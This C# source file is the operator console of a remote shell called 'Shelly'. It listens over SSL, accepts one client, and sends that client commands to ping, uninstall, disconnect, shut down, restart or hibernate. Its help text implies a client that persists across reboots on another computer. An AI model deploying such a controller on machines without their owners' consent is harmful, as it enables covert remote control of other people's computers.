using System;
using System.IO;
using System.Net;
using System.Threading;

namespace Shelly_Server
{
    class Program
    {
        // Server port
        public const string Ip = "127.0.0.1";

        // Server port
        public const int Port = 8500;

        // Create new instance
        public static Thread disconnectionHandler = new Thread(DisconnectionHandler);

        static void Main(string[] args)
        {
            NetworkTryAgain:

            // Check network connectivity
            try
            {
                // Create new instance
                using (var Wc = new WebClient())
                {
                    // try to access google
                    using (var stream = Wc.OpenRead("https://www.google.com"))
                    {

                    }
                }
            }
            catch
            {
                // Show error message
                ShowErrorMessage("ERROR: This program requires an active network connection to work", 5000);
                goto NetworkTryAgain;
            }

            // Get SSL cert file path
            TryAgain:
            Console.WriteLine("SSL certificate file path");

            // Get SSL cert file path
            SocketHandler.CertPath = Console.ReadLine();

            // Check if cert file exists
            if (!File.Exists(SocketHandler.CertPath))
            {
                // Show error message
                ShowErrorMessage("ERROR: Could not find SSL certificate file", 2000);
                goto TryAgain;
            } else
            {
                // Check if file is an actual cert file
                if (Path.GetExtension(SocketHandler.CertPath) == ".pfx")
                {

                }
                else
                {
                    // Show error message
                    ShowErrorMessage("ERROR: File is not an SSL certificate", 2000);
                    goto TryAgain;
                }
            }

            // Get SSL cert file pass
            Console.WriteLine("SSL certificate file password");
            SocketHandler.CertPass = Console.ReadLine();

            // Display message
            Console.Clear();
            Console.WriteLine("Listening...");

            // Start listening
            SocketHandler.Listen();
            Console.Clear();

            // Accept incoming connection, authenticate.. etc
            SocketHandler.Connect();

            // Start the disconnection handler thread
            disconnectionHandler.Start();

            // Display message
            Console.WriteLine("Client connected!");
            Thread.Sleep(2000);
            Console.Clear();

            // UserInput string
            string UserInput;

            // Infinite loop
            while (true)
            {
                // Take user input
                Console.Write(">");
                UserInput = Console.ReadLine();
                Console.Write("\n");

                // Try to read data
                try
                {
                    // Turn to lower case and handle it
                    switch (UserInput.ToLower())
                    {
                        // Shows help section
                        case "help":
                            Console.WriteLine(
                                "SERVER COMMANDS\n" +
                                "1. Help - Displays this help section\n" + // None client
                                "2. Clear - Clears the console\n" + // None client
                                "3. Exit - Exits\n\n" +

                                "GENERAL\n" +

                                "1. Uninstall - Uninstalls Shelly from the client computer\n" +
                                "2. Disconnect - Shuts down the shell until next system startup\n" +
                                "3. Ping - Pings the client and shows the response\n\n" +

                                "POWER OPTIONS\n" +

                                "1. Shutdown\n" +
                                "2. Restart\n" +
                                "3. hibernate"
                            );
                            break;

                        // Clears the console
                        case "clear":
                            Console.Clear();
                            break;

                        // Exit
                        case "exit":

                            // Disconnect and exit
                            ShutdownServer();
                            break;

                        // Uninstall shell
                        case "uninstall":

                            // Send message
                            SocketHandler.Send("uninstall");

                            // Disconnect and exit
                            ShutdownServer();
                            break;

                        // Uninstall shell
                        case "disconnect":

                            // Send message
                            SocketHandler.Send("disconnect");

                            // Disconnect and exit
                            ShutdownServer();
                            break;


                        // Request Ping from client
                        case "ping":

                            // Send message
                            SocketHandler.Send("ping");

                            // Receive response
                            Console.WriteLine(SocketHandler.Receive());
                            break;

                        // Request Ping from client
                        case "shutdown":

                            // Send message
                            SocketHandler.Send("shutdown");

                            // Disconnect and exit
                            ShutdownServer();
                            break;

                        // Request Ping from client
                        case "restart":

                            // Send message
                            SocketHandler.Send("restart");

                            // Disconnect and exit
                            ShutdownServer();
                            break;

                        // Request Ping from client
                        case "hibernate":

                            // Send message
                            SocketHandler.Send("hibernate");
                            break;
                    }
                } catch
                {
                    ShutdownServer();

                    // Exit
                    Environment.Exit(0);
                }
            }
        }

        // DisconnectionHandler thread
        public static void DisconnectionHandler()
        {
            // Infinite loop
            while(true)
            {
                // Check if connection is alive
                if (SocketHandler.ConnectionStatus() == false)
                {
                    // Disconnect
                    SocketHandler.Disconnect();

                    // Display message, NOTE: im not using the ShowDisconnectMessage method here as it messes with the main thread
                    Console.Clear();
                    Console.WriteLine("Client disconnected");
                    Thread.Sleep(2500);

                    // Exit
                    Environment.Exit(0);
                }

                // Check every 5 seconds
                Thread.Sleep(5000);
            }
        }

        public static void ShutdownServer()
        {
            // Stop the disconnectionHandler thread
            disconnectionHandler.Abort();

            // Disconnect
            SocketHandler.Disconnect();

            // Display message
            Console.Clear();
            Console.WriteLine("Client disconnected");
            Thread.Sleep(2500);

            // Exit
            Environment.Exit(0);
        }

        // ShowErrorMessage method
        public static void ShowErrorMessage(string Message, int Delay)
        {
            // Display message
            Console.WriteLine(Message);
            Thread.Sleep(Delay);
            Console.Clear();
        }
    }
}
